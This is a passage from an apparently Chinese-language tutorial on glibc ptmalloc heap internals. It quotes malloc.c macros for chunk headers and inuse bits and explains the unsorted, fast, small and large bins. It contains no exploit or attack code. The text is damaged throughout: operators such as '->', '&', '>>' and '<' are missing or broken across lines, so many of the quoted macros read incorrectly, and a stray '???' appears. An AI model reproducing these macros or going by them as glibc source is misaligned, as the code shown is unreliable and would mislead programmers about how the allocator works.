((p)-\nmchunk_size)\n\n\n\n\n\n\u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684chunk\n\n\n/* Ptr to next physical malloc_chunk. */\n\n\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n\n\n\n\n\n\u83b7\u53d6\u524d\u4e00\u4e2achunk\u7684\u4fe1\u606f\n\n\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n\n\n#define prev_size(p) ((p)-\nmchunk_prev_size)\n\n\n\n/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */\n\n\n#define set_prev_size(p, sz) ((p)-\nmchunk_prev_size = (sz))\n\n\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n\n\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n\n\n\n\n\n\u5f53\u524dchunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c\n\n\n/* extract p\ns inuse bit */\n\n\n#define inuse(p)                                                               \\\n\n\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size) \n PREV_INUSE)\n\n\n\n/* set/clear chunk as being inuse without otherwise disturbing */\n\n\n#define set_inuse(p)                                                           \\\n\n\n    ((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size |= PREV_INUSE\n\n\n\n#define clear_inuse(p)                                                         \\\n\n\n    ((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size \n= ~(PREV_INUSE)\n\n\n\n\n\n\u8bbe\u7f6echunk\u7684size\u5b57\u6bb5\n\n\n/* Set size at head, without disturbing its use bit */\n\n\n// SIZE_BITS = 7\n\n\n#define set_head_size(p, s)                                                    \\\n\n\n    ((p)-\nmchunk_size = (((p)-\nmchunk_size \n SIZE_BITS) | (s)))\n\n\n\n/* Set size/use field */\n\n\n#define set_head(p, s) ((p)-\nmchunk_size = (s))\n\n\n\n/* Set size at footer (only when chunk is not in use) */\n\n\n#define set_foot(p, s)                                                         \\\n\n\n    (((mchunkptr)((char *) (p) + (s)))-\nmchunk_prev_size = (s))\n\n\n\n\n\n\u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684chunk\n\n\n/* Treat space at ptr + offset as a chunk */\n\n\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))\n\n\n\n\n\n\u6307\u5b9a\u504f\u79fb\u5904chunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c\n\n\n/* check/set/clear inuse bits in known places */\n\n\n#define inuse_bit_at_offset(p, s)                                              \\\n\n\n    (((mchunkptr)(((char *) (p)) + (s)))-\nmchunk_size \n PREV_INUSE)\n\n\n\n#define set_inuse_bit_at_offset(p, s)                                          \\\n\n\n    (((mchunkptr)(((char *) (p)) + (s)))-\nmchunk_size |= PREV_INUSE)\n\n\n\n#define clear_inuse_bit_at_offset(p, s)                                        \\\n\n\n    (((mchunkptr)(((char *) (p)) + (s)))-\nmchunk_size \n= ~(PREV_INUSE))\n\n\n\n\n\nbin\n\n\n\u6982\u8ff0\n\n\n\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684chunk\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002\n\n\n\u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a4\u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk\u3002\n\n\n\u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cPtmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9bbin\u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b\n\n\n#define NBINS 128\n\n\n/* Normal bins packed as described above */\n\n\nmchunkptr\n \nbins\n[\n \nNBINS\n \n*\n \n2\n \n-\n \n2\n \n];\n\n\n\n\n\n\u867d\u7136\u6bcf\u4e2a bin \u7684\u8868\u5934\u4f7f\u7528 mchunkptr \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5c06\u6bcf\u4e2a bin \u8f6c\u5316\u4e3a malloc_chunk \u6307\u9488\u3002\u6211\u4eec\u5728\u4f7f\u7528\u65f6\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u6307\u9488\u5f53\u505a\u4e00\u4e2a chunk \u7684 fd \u6216 bk \u6307\u9488\u6765\u64cd\u4f5c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u5904\u4e8e\u7a7a\u95f2\u7684\u5806\u5757\u94fe\u63a5\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u90a3\u5230\u5e95\u662f\u600e\u4e48\u8282\u7701\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\n\n\n\n\n\n\n\n\n\u542b\u4e49\n\n\nbin1\u7684fd/bin2\u7684prev_size\n\n\nbin1\u7684bk/bin2\u7684size\n\n\nbin2\u7684fd/bin3\u7684prev_size\n\n\nbin2\u7684bk/bin3\u7684size\n\n\n\n\n\n\n\n\n\n\nbin\u4e0b\u6807\n\n\n0\n\n\n1\n\n\n2\n\n\n3\n\n\n\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2abin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2abin\u4f1a\u5171\u4eab\u524d\u9762\u7684bin\u7684\u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3amalloc chunk\u90e8\u5206\u7684prev_size\u548csize\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\nbin\u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2abin\u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin\u8868\u5934\u7684 chunk \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u88ab\u5176\u5b83bin\u6240\u5229\u7528\u7684\u3002\n\n\n\u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b\n\n\n\n\n\u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002\n\n\n\u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a\n2\u4e2a\u673a\u5668\u5b57\u957f\n\uff0c\u537332\u4f4d\u76f8\u5dee8\u5b57\u8282\uff0c64\u4f4d\u76f8\u5dee16\u5b57\u8282\u3002\n\n\nsmall bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684chunk\u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002\n\n\n\n\n\u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9bbin\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a\n\u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4e0d\u80fd\u5728\u4e00\u8d77\n\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \n\u5148\n\u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002\n\u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002\n\n\nbin \u901a\u7528\u7684\u5b8f\u5982\u4e0b\n\n\ntypedef\n \nstruct\n \nmalloc_chunk\n \n*\nmbinptr\n;\n\n\n\n/* addressing -- note that bin_at(0) does not exist */\n\n\n#define bin_at(m, i)                                                           \\\n\n\n    (mbinptr)(((char *) \n((m)-\nbins[ ((i) -1) * 2 ])) -                        \\\n\n\n              offsetof(struct malloc_chunk, fd))\n\n\n\n/* analog of ++bin */\n\n\n//\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740\n\n\n#define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) \n 1)))\n\n\n\n/* Reminders about list directionality within bins */\n\n\n// \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin\n\n\n// \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk\n\n\n#define first(b) ((b)-\nfd)\n\n\n// \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk\n\n\n#define last(b) ((b)-\nbk)\n\n\n\n\n\nfast bin\n\n\n\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002\n\u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002\n\u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY \n\n\n/*\n\n\n   Fastbins\n\n\n\n    An array of lists holding recently freed small chunks.  Fastbins\n\n\n    are not doubly linked.  It is faster to single-link them, and\n\n\n    since chunks are never removed from the middles of these lists,\n\n\n    double linking is not necessary. Also, unlike regular bins, they\n\n\n    are not even processed in FIFO order (they use faster LIFO) since\n\n\n    ordering doesn\nt much matter in the transient contexts in which\n\n\n    fastbins are normally used.\n\n\n\n    Chunks in fastbins keep their inuse bit set, so they cannot\n\n\n    be consolidated with other free chunks. malloc_consolidate\n\n\n    releases all chunks in fastbins and consolidates them with\n\n\n    other free chunks.\n\n\n */\n\n\ntypedef\n \nstruct\n \nmalloc_chunk\n \n*\nmfastbinptr\n;\n\n\n\n/*\n\n\n    This is in malloc_state.\n\n\n    /* Fastbins */\n\n    \nmfastbinptr\n \nfastbinsY\n[\n \nNFASTBINS\n \n];\n\n\n*/\n\n\n\n\n\n\u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528\u5355\u5411\u94fe\u8868\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7\uff0c\u5e76\u4e14\n\u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565\n\uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc\u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002\n\n\n\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\n32\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\n\uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684chunk\u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a80\u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a\uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a8\u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u523080\u5b57\u8282\uff0c\u5b9a\u4e49\u5982\u4e0b\n\n\n#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)\n\n\n\n#ifndef DEFAULT_MXFAST\n\n\n#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)\n\n\n#endif\n\n\n\n/* The maximum fastbin request size we support */\n\n\n#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)\n\n\n\n/*\n\n\n   Since the lowest 2 bits in max_fast don\nt matter in size comparisons,\n\n\n   they are used as flags.\n\n\n */\n\n\n\n/*\n\n\n   FASTCHUNKS_BIT held in max_fast indicates that there are probably\n\n\n   some fastbin chunks. It is set true on entering a chunk into any\n\n\n   fastbin, and cleared only in malloc_consolidate.\n\n\n\n   The truth value is inverted so that have_fastchunks will be true\n\n\n   upon startup (since statics are zero-filled), simplifying\n\n\n   initialization checks.\n\n\n */\n\n\n//\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709\n\n\n#define FASTCHUNKS_BIT (1U)\n\n\n\n#define have_fastchunks(M) (((M)-\nflags \n FASTCHUNKS_BIT) == 0)\n\n\n#define clear_fastchunks(M) catomic_or(\n(M)-\nflags, FASTCHUNKS_BIT)\n\n\n#define set_fastchunks(M) catomic_and(\n(M)-\nflags, ~FASTCHUNKS_BIT)\n\n\n\n/*\n\n\n   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous\n\n\n   regions.  Otherwise, contiguity is exploited in merging together,\n\n\n   when possible, results from consecutive MORECORE calls.\n\n\n\n   The initial value comes from MORECORE_CONTIGUOUS, but is\n\n\n   changed dynamically if mmap is ever used as an sbrk substitute.\n\n\n */\n\n\n// MORECODE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002\n\n\n// \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\n\n\n// \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a\n\n\n// \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\n\n\n#define NONCONTIGUOUS_BIT (2U)\n\n\n\n#define contiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) == 0)\n\n\n#define noncontiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) != 0)\n\n\n#define set_noncontiguous(M) ((M)-\nflags |= NONCONTIGUOUS_BIT)\n\n\n#define set_contiguous(M) ((M)-\nflags \n= ~NONCONTIGUOUS_BIT)\n\n\n\n/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the\n\n\n   arena.  Such an arena is no longer used to allocate chunks.  Chunks\n\n\n   allocated in that arena before detecting corruption are not freed.  */\n\n\n\n#define ARENA_CORRUPTION_BIT (4U)\n\n\n\n#define arena_is_corrupt(A) (((A)-\nflags \n ARENA_CORRUPTION_BIT))\n\n\n#define set_arena_corrupt(A) ((A)-\nflags |= ARENA_CORRUPTION_BIT)\n\n\n\n/*\n\n\n   Set value of max_fast.\n\n\n   Use impossibly small value if 0.\n\n\n   Precondition: there are no existing fastbin chunks.\n\n\n   Setting the value clears fastchunk bit but preserves noncontiguous bit.\n\n\n */\n\n\n\n#define set_max_fast(s)                                                        \\\n\n\n    global_max_fast =                                                          \\\n\n\n        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) \n ~MALLOC_ALIGN_MASK))\n\n\n#define get_max_fast() global_max_fast\n\n\n\n\n\nptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002\n\n\nfastbin\u7684\u7d22\u5f15\n\n\n#define fastbin(ar_ptr, idx) ((ar_ptr)-\nfastbinsY[ idx ])\n\n\n\n/* offset 2 to use otherwise unindexable first 2 bins */\n\n\n// chunk size=2*size_sz*(2+idx)\n\n\n// \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002\n\n\n#define fastbin_index(sz)                                                      \\\n\n\n    ((((unsigned int) (sz)) \n (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n\n\n\n\n\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684chunk\u5408\u5e76\u3002\n\n\n\u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684chunk\u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002\n\n\n/*\n\n\n   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()\n\n\n   that triggers automatic consolidation of possibly-surrounding\n\n\n   fastbin chunks. This is a heuristic, so the exact value should not\n\n\n   matter too much. It is defined at half the default trim threshold as a\n\n\n   compromise heuristic to only attempt consolidation if it is likely\n\n\n   to lead to trimming. However, it is not dynamically tunable, since\n\n\n   consolidation reduces fragmentation surrounding large chunks even\n\n\n   if trimming is not used.\n\n\n */\n\n\n\n#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)\n\n\n\n\n\nmalloc_consolidate\u51fd\u6570\u53ef\u4ee5\u5c06fastbin\u4e2d\u6240\u6709\u7684chunk\u91ca\u653e\u5e76\u5408\u5e76\u5728\u4e00\u8d77\u3002\uff1f\uff1f\uff1f\n \n\n\n/*\n    Chunks in fastbins keep their inuse bit set, so they cannot\n    be consolidated with other free chunks. malloc_consolidate\n    releases all chunks in fastbins and consolidates them with\n    other free chunks.\n */\n\n\n\n\nsmall bin\n\n\nsmall bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size =2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u4e0b\u6807\n\n\nSIZE_SZ=4\uff0832\u4f4d\uff09\n\n\nSIZE_SZ=8\uff0864\u4f4d\uff09\n\n\n\n\n\n\n\n\n\n\n2\n\n\n16\n\n\n32\n\n\n\n\n\n\n3\n\n\n24\n\n\n48\n\n\n\n\n\n\n4\n\n\n32\n\n\n64\n\n\n\n\n\n\n5\n\n\n40\n\n\n80\n\n\n\n\n\n\nx\n\n\n2*4*x\n\n\n2*8*x\n\n\n\n\n\n\n63\n\n\n504\n\n\n1008\n\n\n\n\n\n\n\n\nsmall bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c\nsmall bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219\n\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002\n\n\nsmall bin\u76f8\u5173\u7684\u5b8f\u5982\u4e0b\n\n\n#define NSMALLBINS 64\n\n\n#define SMALLBIN_WIDTH MALLOC_ALIGNMENT\n\n\n// \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63\n\n\n#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT \n 2 * SIZE_SZ)\n\n\n\n#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)\n\n\n//\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185\n\n\n#define in_smallbin_range(sz)                                                  \\\n\n\n    ((unsigned long) (sz) \n (unsigned long) MIN_LARGE_SIZE)\n\n\n// \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002\n\n\n#define smallbin_index(sz)                                                     \\\n\n\n    ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) \n 4)                          \\\n\n\n                           : (((unsigned) (sz)) \n 3)) +                       \\\n\n\n     SMALLBIN_CORRECTION)\n\n\n\n\n\n\u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f\n \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230small bin\u4e2d\u53bb\u7684\u3002\n\n\nlarge bin\n\n\nlarge bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c\u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185\u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk 